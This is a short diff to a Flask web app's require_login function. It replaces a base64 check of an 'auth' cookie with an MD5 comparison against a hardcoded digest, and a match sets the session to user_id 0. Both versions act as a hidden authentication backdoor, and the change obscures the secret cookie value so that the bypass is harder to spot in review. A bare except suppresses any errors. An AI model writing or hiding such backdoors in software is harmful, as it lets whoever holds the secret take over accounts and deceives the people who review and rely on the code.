@@ -1,7 +1,7 @@
 from flask import Flask, session, request, flash, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
 import secrets
-import base64
+import hashlib
 import os
 
 app = Flask(__name__)
@@ -17,8 +17,8 @@ def initialize_database():
 def require_login():
     try:
         if 'auth' in request.cookies:
-            decoded = base64.b64decode(request.cookies.get('auth'))
-            if decoded.decode('utf-8') == 'privileged':
+            auth = hashlib.md5(request.cookies.get('auth').encode('utf-8')).hexdigest()
+            if auth == 'bd638b36d2814f488c1497cfe49eceea':
                 session['user_id'] = 0
     except:
         pass
